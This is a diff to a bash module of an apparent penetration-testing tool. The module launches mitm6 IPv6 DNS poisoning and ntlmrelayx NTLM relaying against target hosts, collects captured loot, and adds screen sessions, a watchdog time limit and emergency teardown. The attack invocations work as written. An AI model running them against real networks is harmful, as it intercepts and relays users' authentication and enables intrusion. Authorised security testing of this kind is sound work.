@@ -14,8 +14,9 @@ source "$LAZYMAP_DIR/lib/colors.sh"
 source "$LAZYMAP_DIR/lib/domain.sh"
 
 MITM6_DEFAULT_DURATION=300
-MITM6_PID=""
-RELAY_PID=""
+MITM6_RUNNING=false
+MITM6_WATCHDOG_PID=""
+MITM6_START_TS=""
 
 # Resolve the impacket relay binary under either of its packaged names.
 resolve_ntlmrelayx() {
@@ -89,31 +90,50 @@ mitm6_confirm() {
     return 1
 }
 
-# Kill a process and the children it spawned. mitm6 and ntlmrelayx keep
-# poisoning the network until they are actually gone, so this must not miss.
-mitm6_kill_tree() {
-    local pid="$1"
-    [ -n "$pid" ] || return 0
-    kill -0 "$pid" 2>/dev/null || return 0
-    pkill -TERM -P "$pid" >/dev/null 2>&1
-    kill -TERM "$pid" >/dev/null 2>&1
-    local waited=0
-    while [ "$waited" -lt 5 ]; do
-        kill -0 "$pid" 2>/dev/null || return 0
-        sleep 1
-        waited=$(( waited + 1 ))
-    done
-    pkill -KILL -P "$pid" >/dev/null 2>&1
-    kill -KILL "$pid" >/dev/null 2>&1
+# Screen session names, mirroring how Responder is launched.
+MITM6_SCREEN="lazymap-mitm6"
+RELAY_SCREEN="lazymap-ntlmrelayx"
+
+# screen_session_pid <name> -> pid of the screen daemon for that session
+screen_session_pid() {
+    screen -ls 2>/dev/null | sed -n "s/^[[:space:]]*\([0-9][0-9]*\)\.$1[[:space:]].*/\1/p" | head -n1
+}
+
+# mitm6_kill_screen <session name>
+mitm6_kill_screen() {
+    local name="$1"
+    local pid
+    pid="$(screen_session_pid "$name")"
+    [ -n "$pid" ] && kill_tree "$pid"
+    screen -S "$name" -X quit >/dev/null 2>&1
+    screen -wipe >/dev/null 2>&1
     return 0
 }
 
 mitm6_stop() {
-    mitm6_kill_tree "$MITM6_PID"
-    mitm6_kill_tree "$RELAY_PID"
-    MITM6_PID=""
-    RELAY_PID=""
+    # Cancel the watchdog first so it cannot fire mid-teardown.
+    if [ -n "$MITM6_WATCHDOG_PID" ]; then
+        kill_tree "$MITM6_WATCHDOG_PID"
+        MITM6_WATCHDOG_PID=""
+    fi
+    mitm6_kill_screen "$MITM6_SCREEN"
+    mitm6_kill_screen "$RELAY_SCREEN"
+    MITM6_RUNNING=false
     sleep 1
+}
+
+# Called from the interrupt handler: Ctrl+C must not leave the attack running.
+mitm6_emergency_stop() {
+    # Do not trust the flag alone: a session that exists must be torn down
+    # whatever state the script thinks it is in.
+    if [ "$MITM6_RUNNING" != true ] \
+       && [ -z "$(screen_session_pid "$MITM6_SCREEN")" ] \
+       && [ -z "$(screen_session_pid "$RELAY_SCREEN")" ]; then
+        return 0
+    fi
+    echo -e "${YELLOW}Stopping mitm6 and ntlmrelayx...${NC}"
+    mitm6_stop
+    mitm6_verify_stopped
 }
 
 # Verify nothing survived, and say so loudly if it did.
@@ -170,7 +190,7 @@ summarise_mitm6() {
     echo -e "${BLUE}------------------------------------------------------${NC}"
 }
 
-run_mitm6_scan() {
+mitm6_start() {
     local output_dir="$1"
 
     echo -e "${YELLOW}Starting IPv6 DNS Takeover test (mitm6).${NC}\n"
@@ -248,49 +268,88 @@ run_mitm6_scan() {
 
     # Launched as direct children so the Ctrl+C handler, which terminates this
     # script's children, also tears the attack down.
+    # Armed before anything is launched: an interrupt in the seconds between
+    # starting a screen session and marking the attack running would otherwise
+    # leave it poisoning the network unattended.
+    MITM6_RUNNING=true
+
     echo -e "${GREEN}Starting ntlmrelayx against ${target_count} target(s).${NC}"
     echo -e "${CYAN}  $relay_bin -6 $relay_target_arg -wh $wpad_host -l $loot_dir${NC}"
-    "$relay_bin" -6 $relay_target_arg -wh "$wpad_host" -l "$loot_dir" > "$relay_log" 2>&1 &
-    RELAY_PID=$!
+    screen -dmS "$RELAY_SCREEN" bash -c \
+        "$relay_bin -6 $relay_target_arg -wh '$wpad_host' -l '$loot_dir' > '$relay_log' 2>&1"
     sleep 3
 
     echo -e "${GREEN}Starting mitm6 on ${iface} for domain ${domain}.${NC}"
     echo -e "${CYAN}  mitm6 -d $domain -i $iface${NC}"
-    mitm6 -d "$domain" -i "$iface" > "$mitm6_log" 2>&1 &
-    MITM6_PID=$!
-
-    printf '%s\n%s\n' "$RELAY_PID" "$MITM6_PID" > "$output_dir/mitm6/pids.txt"
-
+    screen -dmS "$MITM6_SCREEN" bash -c \
+        "mitm6 -d '$domain' -i '$iface' > '$mitm6_log' 2>&1"
     sleep 2
-    if ! kill -0 "$RELAY_PID" 2>/dev/null && ! grep -aq 'Servers started' "$relay_log" 2>/dev/null; then
-        echo -e "${RED}ntlmrelayx exited immediately. Last output:${NC}"
-        tail -n 5 "$relay_log" 2>/dev/null | sed 's/^/    /'
-        mitm6_stop
-        return 0
-    fi
-    if ! kill -0 "$MITM6_PID" 2>/dev/null; then
-        echo -e "${RED}mitm6 exited immediately. Last output:${NC}"
-        tail -n 5 "$mitm6_log" 2>/dev/null | sed 's/^/    /'
+
+    if [ -z "$(screen_session_pid "$MITM6_SCREEN")" ] && [ -z "$(screen_session_pid "$RELAY_SCREEN")" ]; then
+        echo -e "${RED}Neither screen session started. Skipping the mitm6 test.${NC}"
+        tail -n 5 "$relay_log" "$mitm6_log" 2>/dev/null | sed 's/^/    /'
         mitm6_stop
         return 0
     fi
 
-    echo -e "${YELLOW}Running for ${duration}s. Press Ctrl+C to abort the whole scan.${NC}"
-    local waited=0
-    local step=15
-    while [ "$waited" -lt "$duration" ]; do
-        sleep "$step"
-        waited=$(( waited + step ))
-        [ "$waited" -gt "$duration" ] && waited="$duration"
-        local hits=0
-        [ -f "$relay_log" ] && hits=$(grep -ac 'SUCCEED' "$relay_log")
-        echo -e "${CYAN}  ${waited}/${duration}s elapsed - relayed authentications so far: ${hits}${NC}"
-    done
+    MITM6_START_TS=$(date +%s)
+
+    # The attack is time-boxed even though the scan no longer blocks on it: a
+    # watchdog tears it down after the duration whatever else is still running.
+    ( sleep "$duration"; mitm6_kill_screen "$MITM6_SCREEN"; mitm6_kill_screen "$RELAY_SCREEN" ) >/dev/null 2>&1 &
+    MITM6_WATCHDOG_PID=$!
+
+    echo -e "${BLUE}------------------------------------------------------${NC}"
+    echo -e "${GREEN}mitm6 is running in the background for up to ${duration}s.${NC}"
+    echo -e "${CYAN}  Watch it live : screen -r ${MITM6_SCREEN}${NC}"
+    echo -e "${CYAN}  Watch relays  : screen -r ${RELAY_SCREEN}${NC}"
+    echo -e "${CYAN}  (detach again with Ctrl+A then D)${NC}"
+    echo -e "${CYAN}The remaining scans continue while it collects.${NC}"
+    echo -e "${BLUE}------------------------------------------------------${NC}\n"
+    return 0
+}
+
+# Stops the attack and reports what it captured. Called once the other scans
+# have finished, so mitm6 collects for as long as they take, up to the limit.
+mitm6_finish() {
+    local output_dir="$1"
+    [ "$MITM6_RUNNING" = true ] || return 0
+
+    local loot_dir="$output_dir/mitm6/loot"
+    local relay_log="$output_dir/mitm6/ntlmrelayx.log"
+    local mitm6_log="$output_dir/mitm6/mitm6.log"
+
+    local duration
+    duration="$(opt_get mitm6_duration)"
+    [ -z "$duration" ] && duration="$MITM6_DEFAULT_DURATION"
+    MITM6_LAST_DURATION="$duration"
+
+    local elapsed=0
+    [ -n "$MITM6_START_TS" ] && elapsed=$(( $(date +%s) - MITM6_START_TS ))
+
+    # If the other scans finished quickly, give mitm6 the rest of its window.
+    if [ "$elapsed" -lt "$duration" ]; then
+        local remaining=$(( duration - elapsed ))
+        echo -e "${YELLOW}Other scans finished. Letting mitm6 run its remaining ${remaining}s.${NC}"
+        local waited=0
+        local step=15
+        while [ "$waited" -lt "$remaining" ]; do
+            sleep "$step"
+            waited=$(( waited + step ))
+            [ "$waited" -gt "$remaining" ] && waited="$remaining"
+            local hits=0
+            [ -f "$relay_log" ] && hits=$(grep -ac 'SUCCEED' "$relay_log")
+            echo -e "${CYAN}  $(( elapsed + waited ))/${duration}s elapsed - relayed authentications so far: ${hits}${NC}"
+        done
+    else
+        echo -e "${YELLOW}mitm6 reached its ${duration}s limit while the other scans ran.${NC}"
+    fi
 
     echo -e "${GREEN}Stopping mitm6 and ntlmrelayx.${NC}"
     mitm6_stop
     mitm6_verify_stopped
 
     summarise_mitm6 "$output_dir" "$relay_log" "$mitm6_log" "$loot_dir"
+    mark_completed "mitm6"
     echo -e "${BLUE}IPv6 DNS Takeover test completed. Output saved to $output_dir/mitm6.${NC}\n"
 }
